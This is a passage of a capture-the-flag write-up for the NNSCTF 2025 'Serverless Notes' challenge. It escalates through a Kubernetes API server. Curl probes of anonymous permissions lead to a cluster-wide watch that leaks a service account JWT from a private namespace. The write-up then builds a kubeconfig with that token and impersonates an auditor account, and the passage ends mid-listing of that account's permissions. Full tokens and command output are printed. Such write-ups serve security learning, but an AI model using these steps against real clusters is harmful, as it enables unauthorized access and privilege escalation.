# Serverless™ Notes - NNSCTF 2025

Challenge by [0xle](https://github.com/0xle)  
Writeup by [YiFei Zhu](https://github.com/zhuyifei1999)  
Canonical Link: https://gist.github.com/zhuyifei1999/16264ed46f8dd9b7001383873bee022b

> Seems like serverless is the new trend after "cloud transformation". Being
> serverless, I don't have to care about my backend at all! Maybe I should?

This weekend I played with TheHackersCrew in NNSCTF 2025. I think this is
probably one of the coolest challenges I solved so far (albeit the somewhat
guessy start), so here's a writeup :) (mostly so that I can remember all this)

Attached solve.py is for an automated solve; since the tokens get rotated every
instance restart, I didn't want to bother with redo-ing the copy-paste each
restart.

## Initial Looks

Launching the instance gives a single-page web application, with contents:
```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
  <title>Notes</title>
</head>
<body class="flex flex-col items-center">
<div class="max-w-6xl w-full p-8">
  <h1 class="text-3xl font-bold">Notes</h1>
  <div>
    Serverless applications may take a while to warm up... Please be patient!
  </div>
  <div class="grid grid-cols-2 md:grid-cols-3 mt-4 gap-1">
    <div id="create-note-btn" class="rounded-md border border-neutral-200 p-4 cursor-pointer bg-linear-to-t from-blue-500 to-violet-500 text-white" role="button">
      <div class="font-bold">
        Create note
      </div>
      <p>
        Start imagining...
      </p>
    </div>
    <div id="notes-container" class="contents">
    </div>
  </div>
</div>
<script>
    const notes = [];

    function persistNotesIndex() {
        const index = notes.map(note => note.metadata.name);
        localStorage.setItem("notes", JSON.stringify(index));
    }

    async function loadNotes() {
        const index = JSON.parse(localStorage.getItem("notes") ?? "[]");
        for (const id of index) {
            try {
                const note = await fetch(`/apis/nnsctf.no/v1/namespaces/default/notes/${id}`)
                    .then(res => res.json());
                notes.push(note)
            } catch (e) {
                console.error("was?", e);
            }
        }
    }

    async function createNote(title, content) {
        const id = crypto.randomUUID();
        return await fetch(
            `/apis/nnsctf.no/v1/namespaces/default/notes/${id}`,
            {
                method: "POST",
                body: JSON.stringify({
                    apiVersion: "nnsctf.no/v1",
                    kind: "Note",
                    metadata: {name: id},
                    spec: {title, content}
                }),
                headers: {
                    "content-type": "application/json"
                }
            }
        ).then(res => res.json());
    }

    function renderNotes() {
        const container = document.getElementById("notes-container");
        container.innerHTML = "";

        for (const note of notes) {
            const elem = document.createElement("div");
            elem.classList.add("rounded-md", "border", "border-neutral-200", "p-4");

            const titleElem = document.createElement("div");
            titleElem.classList.add("font-bold");
            titleElem.textContent = note.spec.title;

            const contentElem = document.createElement("p");
            contentElem.textContent = note.spec.content;

            elem.append(titleElem, contentElem);
            container.appendChild(elem);
        }
    }

    function attachEventListeners() {
        document.getElementById("create-note-btn").addEventListener("click", async () => {
            try {
                const title = prompt("What should the title of the note be?");
                const content = prompt("What should the content of the note be?");
                const note = await createNote(title, content);
                if (typeof note["spec"] !== "object") {
                    alert("a bad happened!!");
                    return;
                }
                notes.push(note);
                persistNotesIndex();
                renderNotes();
            } catch (e) {
                console.error("was?", e);
                alert("a bad happened!!");
            }
        });
    }

    attachEventListeners();
    (async () => {
        await loadNotes();
        renderNotes();
    })();
</script>
</body>
</html>
```

The URLs `/apis/nnsctf.no/v1/namespaces/default/notes/` indicates that this is
backed by a Kubernetes (k8s) API server. Notes are stored in a namespaced CRD
`nnsctf.no/v1/notes`, with each note having a random UUID. The list of notes
is stored client-side in `localStorage`, so the ability to enumerate notes is
not a given. K8s accesses are not authenticated.

Using k8s as a database is something I thought of, but never taken seriously.
There are some infra-related services that stores information as k8s resources,
like [velero](https://velero.io/), but I've always personally treated k8s
resources as ephemeral, other than persistent disks which I paranoidly take
lots of backups of them. Not to mention that I'm too lazy to write CRD
definitions...

## From Nobody to Intern

My first reaction was... can I list notes? No:

```bash
$ curl https://$INSTANCE.chall.nnsc.tf/apis/nnsctf.no/v1/namespaces/default/notes/; echo
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "notes.nnsctf.no is forbidden: User \"system:anonymous\" cannot list resource \"notes\" in API group \"nnsctf.no\" in the namespace \"default\"",
  "reason": "Forbidden",
  "details": {
    "group": "nnsctf.no",
    "kind": "notes"
  },
  "code": 403
}
```

K8s supports many
[verbs](https://kubernetes.io/docs/reference/using-api/api-concepts/#api-verbs)
on an object:

- `get` and `create` are allowed, as used in the embedded JS of the webpage.
- `list` is not allowed, as seen above.
- `delete`, `patch`, and `update` are all not allowed:
  ```bash
  $ curl -X DELETE https://$INSTANCE.chall.nnsc.tf/apis/nnsctf.no/v1/namespaces/default/notes/foo; echo
  [...]
    "message": "notes.nnsctf.no \"foo\" is forbidden: User \"system:anonymous\" cannot delete resource \"notes\" in API group \"nnsctf.no\" in the namespace \"default\"",
  [...]
  $ curl -X PATCH https://$INSTANCE.chall.nnsc.tf/apis/nnsctf.no/v1/namespaces/default/notes/foo; echo
  [...]
    "message": "notes.nnsctf.no \"foo\" is forbidden: User \"system:anonymous\" cannot patch resource \"notes\" in API group \"nnsctf.no\" in the namespace \"default\"",
  [...]
  $ curl -X PUT https://$INSTANCE.chall.nnsc.tf/apis/nnsctf.no/v1/namespaces/default/notes/foo; echo
  [...]
    "message": "notes.nnsctf.no \"foo\" is forbidden: User \"system:anonymous\" cannot update resource \"notes\" in API group \"nnsctf.no\" in the namespace \"default\"",
  [...]
  ```
- and `deletecollection`, which would be a cheat code to getting a list of
  note names, does not work either:
  ```bash
  $ curl -X DELETE https://$INSTANCE.chall.nnsc.tf/apis/nnsctf.no/v1/namespaces/default/notes/; echo
  [...]
    "message": "notes.nnsctf.no is forbidden: User \"system:anonymous\" cannot deletecollection resource \"notes\" in API group \"nnsctf.no\" in the namespace \"default\"",
  ```
- what does seem to hint at potentially working though... was `watch`:
  ```bash
  $ time curl https://$INSTANCE.chall.nnsc.tf/apis/nnsctf.no/v1/namespaces/default/notes/?watch=1
  upstream request timeout
  real	0m15.688s
  user	0m0.023s
  sys	0m0.011s
  ```
  ... if only it doesn't time out.

I was stuck here for a while, and one of the times I issued watch happened to
coincide with the chal instance timing out (and hence shutting down), and I
received the notes I added on the web interface:
```bash
$ curl https://b2da906e-9c8a-4487-b568-e3651f046899.chall.nnsc.tf/apis/nnsctf.no/v1/namespaces/default/notes/?watch=1
{"type":"ADDED","object":{"apiVersion":"nnsctf.no/v1","kind":"Note","metadata":{"creationTimestamp":"2025-08-29T20:57:07Z","generation":1,"managedFields":[{"apiVersion":"nnsctf.no/v1","fieldsType":"FieldsV1","fieldsV1":{"f:spec":{".":{},"f:content":{},"f:title":{}}},"manager":"Mozilla","operation":"Update","time":"2025-08-29T20:57:07Z"}],"name":"03dbc0b7-a327-401f-8354-ed2eb897b65e","namespace":"default","resourceVersion":"298","uid":"4fa1d8a8-2f09-47d4-8427-c48087d015c9"},"spec":{"content":"aaaaaaa","title":"aaaa"}}}
{"type":"ADDED","object":{"apiVersion":"nnsctf.no/v1","kind":"Note","metadata":{"creationTimestamp":"2025-08-29T21:23:32Z","generation":1,"managedFields":[{"apiVersion":"nnsctf.no/v1","fieldsType":"FieldsV1","fieldsV1":{"f:spec":{".":{},"f:content":{},"f:title":{}}},"manager":"Mozilla","operation":"Update","time":"2025-08-29T21:23:32Z"}],"name":"064aceac-7362-4333-90c6-6fb750ca22b3","namespace":"default","resourceVersion":"622","uid":"fae7b0e2-8e28-4b7b-bd54-c2e8c3534a99"},"spec":{"content":"bbbb","title":"aaaa"}}}
{"type":"ADDED","object":{"apiVersion":"nnsctf.no/v1","kind":"Note","metadata":{"creationTimestamp":"2025-08-29T20:57:36Z","generation":1,"managedFields":[{"apiVersion":"nnsctf.no/v1","fieldsType":"FieldsV1","fieldsV1":{"f:spec":{".":{},"f:content":{},"f:title":{}}},"manager":"Mozilla","operation":"Update","time":"2025-08-29T20:57:36Z"}],"name":"40884bb5-aa9b-45d8-a2fd-fba9bc93c4d3","namespace":"default","resourceVersion":"305","uid":"773e804c-8f8d-460c-b379-21ed7e264d3a"},"spec":{"content":"cdef","title":"bbbb"}}}
{"type":"ADDED","object":{"apiVersion":"nnsctf.no/v1","kind":"Note","metadata":{"creationTimestamp":"2025-08-29T21:23:21Z","generation":1,"managedFields":[{"apiVersion":"nnsctf.no/v1","fieldsType":"FieldsV1","fieldsV1":{"f:spec":{".":{},"f:content":{},"f:title":{}}},"manager":"Mozilla","operation":"Update","time":"2025-08-29T21:23:21Z"}],"name":"4d7f97a5-7198-4884-916b-a1289514743f","namespace":"default","resourceVersion":"619","uid":"a29aa13b-0bec-434b-8c8d-5a2bcb990e37"},"spec":{"content":"bbbbbbbbbb","title":"aaaaaaaa"}}}
{"type":"ADDED","object":{"apiVersion":"nnsctf.no/v1","kind":"Note","metadata":{"creationTimestamp":"2025-08-29T20:58:24Z","generation":1,"managedFields":[{"apiVersion":"nnsctf.no/v1","fieldsType":"FieldsV1","fieldsV1":{"f:spec":{".":{},"f:content":{},"f:title":{}}},"manager":"Mozilla","operation":"Update","time":"2025-08-29T20:58:24Z"}],"name":"7b8caf26-7ed8-4c9f-a9dc-200c6abc3e23","namespace":"default","resourceVersion":"315","uid":"d3185294-8eca-430c-a6b8-2c9266c0df7f"},"spec":{"content":"abcd","title":"abcdef"}}}
```

I was surprised and glad to make progress, but unfortunately, there was no note
that wasn't added by myself. Fortunately though, this is reproducible by
manually stopping the chal instance. *(Post-event note: Chal author said
`watch` is also possible if I add a couple notes while watching. I was able to
confirm this. I guess the response was being buffered somewhere, and once there
was enough response data it got sent back. I further confirmed this by adding
some notes (enough to satisfy the response threshold at 3784 bytes (the response
cuts off at this threshold, though weirdly, the next threshold of response is
7880 bytes, increase of 1 page size)), then `watch` directly without
simultaneously adding notes; it also worked.)*

I thought maybe this is some very old kubernetes version and might contain some
known bugs, but the build is very recent:
```bash
$ curl https://$INSTANCE/version; echo
{
  "major": "1",
  "minor": "31",
  "gitVersion": "v1.31.12+k3s1",
  "gitCommit": "2b53c7e4c81742fbb2b0e7e90e3bb907d1fe0e24",
  "gitTreeState": "clean",
  "buildDate": "2025-08-25T18:30:01Z",
  "goVersion": "go1.23.11",
  "compiler": "gc",
  "platform": "linux/amd64"
}
```

I was again stuck. I tried to create a k3s cluster myself, and for each of the
resources it has built-in, I tried to see if I have `get` and `list`
permissions on the chal instance... Nothing.

I put this challenge on hold until it got blooded.

Then I found, the `get`, `create`, and `watch` permissions I have for `note`,
is across all namespaces... I could `watch` on all namespaces, right? Indeed:
```bash
$ curl https://79e547b7-7be4-4519-bd41-e006c9d80e00.chall.nnsc.tf/apis/nnsctf.no/v1/notes/?watch=1; echo
{"type":"ADDED","object":{"apiVersion":"nnsctf.no/v1","kind":"Note","metadata":{"creationTimestamp":"2025-08-30T23:39:17Z","generation":1,"managedFields":[{"apiVersion":"nnsctf.no/v1","fieldsType":"FieldsV1","fieldsV1":{"f:spec":{}},"manager":"Mozilla","operation":"Update","time":"2025-08-30T23:39:17Z"}],"name":"5d438869-6dc1-4004-8b80-6792aabe4dd1","namespace":"default","resourceVersion":"338","uid":"a6a44683-44e5-4500-ae57-6b282a338524"},"spec":{}}}
{"type":"ADDED","object":{"apiVersion":"nnsctf.no/v1","kind":"Note","metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"nnsctf.no/v1\",\"kind\":\"Note\",\"metadata\":{\"annotations\":{},\"name\":\"1cf56255-ce46-4b8a-9555-b6c71c202db5\",\"namespace\":\"private-notes\"},\"spec\":{\"content\":\"eyJhbGciOiJSUzI1NiIsImtpZCI6IjFoQk1ZZnE3cGpRODNzYUs2MElUaVZBb1NydjNsWmM5NFFKM1R1RkxyZTgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzU2NjgzMzE3LCJpYXQiOjE3NTY1OTY5MTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNDA2MjUzMzktOGU2OC00YzY1LWJmNGYtMzY5Y2JhMGZhZWVkIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZXZzZWNvb3BzIiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldnNlY29vcHMtaW50ZXJuIiwidWlkIjoiZmRiN2ExNzktMTM2Yy00ZGM0LWFkY2QtNDcyOGU5MGJmYzU2In19LCJuYmYiOjE3NTY1OTY5MTcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZXZzZWNvb3BzOmRldnNlY29vcHMtaW50ZXJuIn0.UTSwgRUfuWojyaXUAz1lBR6Vug-kkoKjH_SDDFUmN77qYoJ4xohLA5ONvfRCNA-zDvAMYVn1sTeyUR1CAezUFT895Z-6jt81P7F0Tlkv1Z-MUjC1cN7rMu5zsxprQHmVwq1DkmtfRKDWE96BNzEAAUAOqnp3PWLv8JgFl5U_wpecZ760WH6-PZ2rvWiA28m-yxwZBmYniZoLVojZOtX1WqqKJMbLdxdtu9b7YIc5DWxSOJlWNr_MfcFGa6fV6ghjTXpe619CTaVOO9r85bzU4PkZ952rZ4WQB81uPwc9LQjI1ZovMbWTFlv4l0d5kmxnPEpDqDilrY2klapXJZNcvw\",\"title\":\"Infrastructure TODO\"}}\n"},"creationTimestamp":"2025-08-30T23:35:17Z","generation":1,"managedFields":[{"apiVersion":"nnsctf.no/v1","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:kubectl.kubernetes.io/last-applied-configuration":{}}},"f:spec":{".":{},"f:content":{},"f:title":{}}},"manager":"kubectl-client-side-apply","operation":"Update","time":"2025-08-30T23:35:17Z"}],"name":"1cf56255-ce46-4b8a-9555-b6c71c202db5","namespace":"private-notes","resourceVersion":"288","uid":"82157b4b-5431-492e-b054-f14dfe7c9712"},"spec":{"content":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjFoQk1ZZnE3cGpRODNzYUs2MElUaVZBb1NydjNsWmM5NFFKM1R1RkxyZTgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzU2NjgzMzE3LCJpYXQiOjE3NTY1OTY5MTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNDA2MjUzMzktOGU2OC00YzY1LWJmNGYtMzY5Y2JhMGZhZWVkIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZXZzZWNvb3BzIiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldnNlY29vcHMtaW50ZXJuIiwidWlkIjoiZmRiN2ExNzktMTM2Yy00ZGM0LWFkY2QtNDcyOGU5MGJmYzU2In19LCJuYmYiOjE3NTY1OTY5MTcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZXZzZWNvb3BzOmRldnNlY29vcHMtaW50ZXJuIn0.UTSwgRUfuWojyaXUAz1lBR6Vug-kkoKjH_SDDFUmN77qYoJ4xohLA5ONvfRCNA-zDvAMYVn1sTeyUR1CAezUFT895Z-6jt81P7F0Tlkv1Z-MUjC1cN7rMu5zsxprQHmVwq1DkmtfRKDWE96BNzEAAUAOqnp3PWLv8JgFl5U_wpecZ760WH6-PZ2rvWiA28m-yxwZBmYniZoLVojZOtX1WqqKJMbLdxdtu9b7YIc5DWxSOJlWNr_MfcFGa6fV6ghjTXpe619CTaVOO9r85bzU4PkZ952rZ4WQB81uPwc9LQjI1ZovMbWTFlv4l0d5kmxnPEpDqDilrY2klapXJZNcvw","title":"Infrastructure TODO"}}}
$ curl https://5e227c2c-4f5b-40e3-b5d9-d09403ecce85.chall.nnsc.tf/apis/nnsctf.no/v1/namespaces/private-notes/notes/1cf56255-ce46-4b8a-9555-b6c71c202db5
{
  "apiVersion": "nnsctf.no/v1",
  "kind": "Note",
  "metadata": {
    "annotations": {
      "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"nnsctf.no/v1\",\"kind\":\"Note\",\"metadata\":{\"annotations\":{},\"name\":\"1cf56255-ce46-4b8a-9555-b6c71c202db5\",\"namespace\":\"private-notes\"},\"spec\":{\"content\":\"eyJhbGciOiJSUzI1NiIsImtpZCI6InQyTE1heWdkTnQwdjZ0aHJGN2NhdTF5ZDJuQW81d1FGa0VVMEV0YmRNN0UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzU2NjgzNzk4LCJpYXQiOjE3NTY1OTczOTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNjZkYzc4MTUtYWY3Ny00YzNjLTgwZjctOGIwOTMwODEyMzdiIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZXZzZWNvb3BzIiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldnNlY29vcHMtaW50ZXJuIiwidWlkIjoiNmM0MzAxMzgtY2RjZC00YjQ3LTlkNmItY2QzNzBlYTc4MjViIn19LCJuYmYiOjE3NTY1OTczOTgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZXZzZWNvb3BzOmRldnNlY29vcHMtaW50ZXJuIn0.cKL3TD4E9ydZj2njwEM6KgoHjQaQEMLr4nOnUnga3L-wMaf_DABqxwaI02rX-UNNhJgxKPcp6K9PLcFhHzPUubX-5S_VNuQ1VhEOnS6vb7Q0ipaWuxJpxSlNQOuYXdM-S0ug6OUcrHd5XfN760TfPvr9M_1CHh-mbVcdL5cCGltLd0hB2fGtRyvfINuD4dN2Eq8nS17YrUnfGZPc-ni53qKGHn05pgwwccwWkfCCNPlrmEd-cBvSnwwC4FXiGrdUXN1xb7aic4kMDy58MUk8tWc0IOSi8aq8D4bs52JrGnFOF4hngodho6rfGavQHW94wVSl4gKdQ1SlKfiBm1R1_Q\",\"title\":\"Infrastructure TODO\"}}\n"
    },
    "creationTimestamp": "2025-08-30T23:43:18Z",
    "generation": 1,
    "managedFields": [
      {
        "apiVersion": "nnsctf.no/v1",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:metadata": {
            "f:annotations": {
              ".": {},
              "f:kubectl.kubernetes.io/last-applied-configuration": {}
            }
          },
          "f:spec": {
            ".": {},
            "f:content": {},
            "f:title": {}
          }
        },
        "manager": "kubectl-client-side-apply",
        "operation": "Update",
        "time": "2025-08-30T23:43:18Z"
      }
    ],
    "name": "1cf56255-ce46-4b8a-9555-b6c71c202db5",
    "namespace": "private-notes",
    "resourceVersion": "288",
    "uid": "4e92cf9d-390f-4dac-ae52-be4fa86f4d41"
  },
  "spec": {
    "content": "eyJhbGciOiJSUzI1NiIsImtpZCI6InQyTE1heWdkTnQwdjZ0aHJGN2NhdTF5ZDJuQW81d1FGa0VVMEV0YmRNN0UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzU2NjgzNzk4LCJpYXQiOjE3NTY1OTczOTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNjZkYzc4MTUtYWY3Ny00YzNjLTgwZjctOGIwOTMwODEyMzdiIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZXZzZWNvb3BzIiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldnNlY29vcHMtaW50ZXJuIiwidWlkIjoiNmM0MzAxMzgtY2RjZC00YjQ3LTlkNmItY2QzNzBlYTc4MjViIn19LCJuYmYiOjE3NTY1OTczOTgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZXZzZWNvb3BzOmRldnNlY29vcHMtaW50ZXJuIn0.cKL3TD4E9ydZj2njwEM6KgoHjQaQEMLr4nOnUnga3L-wMaf_DABqxwaI02rX-UNNhJgxKPcp6K9PLcFhHzPUubX-5S_VNuQ1VhEOnS6vb7Q0ipaWuxJpxSlNQOuYXdM-S0ug6OUcrHd5XfN760TfPvr9M_1CHh-mbVcdL5cCGltLd0hB2fGtRyvfINuD4dN2Eq8nS17YrUnfGZPc-ni53qKGHn05pgwwccwWkfCCNPlrmEd-cBvSnwwC4FXiGrdUXN1xb7aic4kMDy58MUk8tWc0IOSi8aq8D4bs52JrGnFOF4hngodho6rfGavQHW94wVSl4gKdQ1SlKfiBm1R1_Q",
    "title": "Infrastructure TODO"
  }
}
```

This note's content was very interesting. It looks like base64, and decoding
until invalid gives
`{"alg":"RS256","kid":"t2LMaygdNt0v6thrF7cau1yd2nAo5wQFkEU0EtbdM7E"}`.

Googling RS256 I found this to be a JWT token, and with a JWT decoder (I used
https://developer.pingidentity.com/en/tools/jwt-decoder.html at the time), I
got the payload:
```json
{
  "aud": [
    "https://kubernetes.default.svc.cluster.local",
    "k3s"
  ],
  "exp": 1756683798,
  "iat": 1756597398,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "jti": "66dc7815-af77-4c3c-80f7-8b093081237b",
  "kubernetes.io": {
    "namespace": "devsecoops",
    "serviceaccount": {
      "name": "devsecoops-intern",
      "uid": "6c430138-cdcd-4b47-9d6b-cd370ea7825b"
    }
  },
  "nbf": 1756597398,
  "sub": "system:serviceaccount:devsecoops:devsecoops-intern"
}
```

Hmm... This looks to be a service account token for a service account named
`devsecoops-intern` in namespace `devsecoops`. I wonder if it authenticates:

```bash
$ curl -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6InQyTE1heWdkTnQwdjZ0aHJGN2NhdTF5ZDJuQW81d1FGa0VVMEV0YmRNN0UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzU2NjgzNzk4LCJpYXQiOjE3NTY1OTczOTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNjZkYzc4MTUtYWY3Ny00YzNjLTgwZjctOGIwOTMwODEyMzdiIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZXZzZWNvb3BzIiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldnNlY29vcHMtaW50ZXJuIiwidWlkIjoiNmM0MzAxMzgtY2RjZC00YjQ3LTlkNmItY2QzNzBlYTc4MjViIn19LCJuYmYiOjE3NTY1OTczOTgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZXZzZWNvb3BzOmRldnNlY29vcHMtaW50ZXJuIn0.cKL3TD4E9ydZj2njwEM6KgoHjQaQEMLr4nOnUnga3L-wMaf_DABqxwaI02rX-UNNhJgxKPcp6K9PLcFhHzPUubX-5S_VNuQ1VhEOnS6vb7Q0ipaWuxJpxSlNQOuYXdM-S0ug6OUcrHd5XfN760TfPvr9M_1CHh-mbVcdL5cCGltLd0hB2fGtRyvfINuD4dN2Eq8nS17YrUnfGZPc-ni53qKGHn05pgwwccwWkfCCNPlrmEd-cBvSnwwC4FXiGrdUXN1xb7aic4kMDy58MUk8tWc0IOSi8aq8D4bs52JrGnFOF4hngodho6rfGavQHW94wVSl4gKdQ1SlKfiBm1R1_Q' https://5e227c2c-4f5b-40e3-b5d9-d09403ecce85.chall.nnsc.tf/apis/nnsctf.no/v1/namespaces/private-notes/notes/1cf56255-ce46-4b8a-9555-b6c71c202db5; echo
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "notes.nnsctf.no \"1cf56255-ce46-4b8a-9555-b6c71c202db5\" is forbidden: User \"system:serviceaccount:devsecoops:devsecoops-intern\" cannot get resource \"notes\" in API group \"nnsctf.no\" in the namespace \"private-notes\"",
  "reason": "Forbidden",
  "details": {
    "name": "1cf56255-ce46-4b8a-9555-b6c71c202db5",
    "group": "nnsctf.no",
    "kind": "notes"
  },
  "code": 403
}
```

It does authenticate, but it no longer has permission to look at notes.

## From Intern to Auditor

With a proper service account token, I can create a `kubeconfig.yaml` for
kubectl to consume, so I have easier command line access instead of direct API
calls.

`kubeconfig-intern.yaml`:
```yaml
apiVersion: v1
kind: Config
clusters:
  - name: notes
    cluster:
      server: https://5e227c2c-4f5b-40e3-b5d9-d09403ecce85.chall.nnsc.tf:443
contexts:
  - name: devsecoops-intern@notes
    context:
      cluster: notes
      namespace: devsecoops
      user: devsecoops-intern
users:
  - name: devsecoops-intern
    user:
      token: eyJhbGciOiJSUzI1NiIsImtpZCI6InQyTE1heWdkTnQwdjZ0aHJGN2NhdTF5ZDJuQW81d1FGa0VVMEV0YmRNN0UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzU2NjgzNzk4LCJpYXQiOjE3NTY1OTczOTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNjZkYzc4MTUtYWY3Ny00YzNjLTgwZjctOGIwOTMwODEyMzdiIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZXZzZWNvb3BzIiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldnNlY29vcHMtaW50ZXJuIiwidWlkIjoiNmM0MzAxMzgtY2RjZC00YjQ3LTlkNmItY2QzNzBlYTc4MjViIn19LCJuYmYiOjE3NTY1OTczOTgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZXZzZWNvb3BzOmRldnNlY29vcHMtaW50ZXJuIn0.cKL3TD4E9ydZj2njwEM6KgoHjQaQEMLr4nOnUnga3L-wMaf_DABqxwaI02rX-UNNhJgxKPcp6K9PLcFhHzPUubX-5S_VNuQ1VhEOnS6vb7Q0ipaWuxJpxSlNQOuYXdM-S0ug6OUcrHd5XfN760TfPvr9M_1CHh-mbVcdL5cCGltLd0hB2fGtRyvfINuD4dN2Eq8nS17YrUnfGZPc-ni53qKGHn05pgwwccwWkfCCNPlrmEd-cBvSnwwC4FXiGrdUXN1xb7aic4kMDy58MUk8tWc0IOSi8aq8D4bs52JrGnFOF4hngodho6rfGavQHW94wVSl4gKdQ1SlKfiBm1R1_Q
current-context: devsecoops-intern@notes
```

I got distracted at this point looking at the various API resources, almost all
of which I still had no access to under this service account, but eventually I
figured out how to list my permissions under this service account:

```bash
$ kubectl --kubeconfig=kubeconfig-intern.yaml auth can-i --list
Resources                                       Non-Resource URLs                      Resource Names         Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []                     [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []                     [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []                     [create]
                                                [/.well-known/openid-configuration/]   []                     [get]
                                                [/.well-known/openid-configuration]    []                     [get]
                                                [/api/*]                               []                     [get]
                                                [/api]                                 []                     [get]
                                                [/apis/*]                              []                     [get]
                                                [/apis]                                []                     [get]
                                                [/healthz]                             []                     [get]
                                                [/healthz]                             []                     [get]
                                                [/livez]                               []                     [get]
                                                [/livez]                               []                     [get]
                                                [/openapi/*]                           []                     [get]
                                                [/openapi]                             []                     [get]
                                                [/openid/v1/jwks/]                     []                     [get]
                                                [/openid/v1/jwks]                      []                     [get]
                                                [/readyz]                              []                     [get]
                                                [/readyz]                              []                     [get]
                                                [/version/]                            []                     [get]
                                                [/version/]                            []                     [get]
                                                [/version]                             []                     [get]
                                                [/version]                             []                     [get]
serviceaccounts                                 []                                     [devsecoops-auditor]   [impersonate]
```

`selfsubjectreviews`, `selfsubjectaccessreviews`, and `selfsubjectrulesreviews`
are [irrelevant](https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/self-subject-access-review-v1/),
as they are what makes `auth can-i` work.

Though, hmm, impersonation of `devsecoops-auditor`... how do I impersonate
again?

```bash
$ kubectl --kubeconfig=kubeconfig-intern.yaml --as=devsecoops-auditor auth can-i --list
Error from server (Forbidden): users "devsecoops-auditor" is forbidden: User "system:serviceaccount:devsecoops:devsecoops-intern" cannot impersonate resource "users" in API group "" at the cluster scope
$ kubectl --kubeconfig=kubeconfig-intern.yaml --as='system:serviceaccount:devsecoops:devsecoops-auditor' auth can-i --list
Resources                                       Non-Resource URLs                      Resource Names   Verbs
secrets                                         []                                     []               [create get]
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
